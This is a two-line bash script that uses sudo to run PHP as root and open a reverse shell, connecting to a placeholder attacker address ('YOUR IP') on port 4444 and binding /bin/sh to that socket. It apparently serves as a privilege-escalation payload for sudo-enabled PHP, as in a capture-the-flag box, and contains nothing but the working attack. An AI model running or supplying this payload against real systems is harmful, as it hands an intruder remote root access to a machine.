#! /bin/bash

sudo /usr/bin/php -r '$sock=fsockopen("YOUR IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
